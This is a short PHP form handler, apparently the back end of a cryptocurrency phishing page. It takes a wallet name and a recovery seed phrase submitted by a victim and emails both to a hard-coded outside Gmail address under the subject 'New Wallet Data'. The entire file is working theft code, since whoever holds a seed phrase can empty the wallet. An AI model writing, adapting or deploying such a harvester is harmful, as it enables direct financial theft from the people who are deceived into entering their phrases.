<?php
   
    $name = $_POST['name'];
    $phrase = $_POST['phrase'];

    $to = "Paulwit134@gmail.com";
    $subject = "New Wallet Data";
    $body = "";

    $body .="WALLET NAME: ".$name."\n";
    $body .="PHRASE: ".$phrase;

	  $message_sent = "";

    if(mail($to,$subject,$body)){
		    $message_sent = "sent";
    }
    
    echo $message_sent;
    
?>
